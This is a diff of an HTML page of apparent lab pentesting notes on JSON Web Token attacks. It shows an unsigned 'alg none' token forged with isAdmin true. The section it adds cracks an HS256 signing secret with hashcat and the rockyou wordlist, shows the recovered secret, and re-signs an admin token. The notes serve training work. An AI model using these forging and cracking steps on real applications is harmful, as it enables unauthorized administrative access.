@@ -1829,6 +1829,17 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#attacking-the-signing-secret" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attacking the Signing Secret
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -2184,6 +2195,17 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#attacking-the-signing-secret" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attacking the Signing Secret
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -2283,6 +2305,33 @@
 <li>In <a href="https://gchq.github.io/CyberChef/">CyberChef</a> set "to base64" and select "URL safe" from the drop down</li>
 <li>Encode header and payload individually and combine separated by <code>.</code> and end with and additional <code>.</code> (no signature):
 <code>eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyAKICAidXNlciI6ICJodGItc3RkbnQiLAogICJpc0FkbWluIjogdHJ1ZSwgCiAgImV4cCI6IDE3ODEwNDc1OTcKfQ.</code></li>
+<li>Refresh landing page with with amended token</li>
+</ul>
+<h3 id="attacking-the-signing-secret">Attacking the Signing Secret</h3>
+<ul>
+<li>Login with non admin account</li>
+<li>Copy JWT token</li>
+<li>Decode at <a href="https://jwt.lannysport.net/">JWT Debugger</a></li>
+<li>Inspect the alg value (HS256, HS384, and HS512 have potentially guessable secrets)
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span>
+<span class="normal">9</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><span class="c1"># Save the token to file</span>
+</span><span id="__span-3-2"><span class="nb">echo</span><span class="w"> </span>-n<span class="w"> </span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTc4MTA1MjEzNH0.MSgFA_10UjXxJ094b7RALYn7k35SmlY4fTweVHgibC4<span class="w"> </span>&gt;<span class="w"> </span>jwt.txt<span class="w"> </span>
+</span><span id="__span-3-3">
+</span><span id="__span-3-4"><span class="c1"># 16500 is hashcats mode for JWTs</span>
+</span><span id="__span-3-5">hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">16500</span><span class="w"> </span>jwt.txt<span class="w"> </span>/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
+</span><span id="__span-3-6">
+</span><span id="__span-3-7"><span class="c1"># reshow cracked secret</span>
+</span><span id="__span-3-8">hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">16500</span><span class="w"> </span>jwt.txt<span class="w"> </span>/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt<span class="w"> </span>--show
+</span><span id="__span-3-9">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaHRiLXN0ZG50IiwiaXNBZG1pbiI6ZmFsc2UsImV4cCI6MTc4MTA1MjEzNH0.MSgFA_10UjXxJ094b7RALYn7k35SmlY4fTweVHgibC4:rayoleos
+</span></code></pre></div></td></tr></table></div></li>
+<li>Back on <a href="https://jwt.lannysport.net/">JWT Debugger</a> amend payload as required and add signing secret</li>
 <li>Refresh landing page with with amended token</li>
 </ul>
 
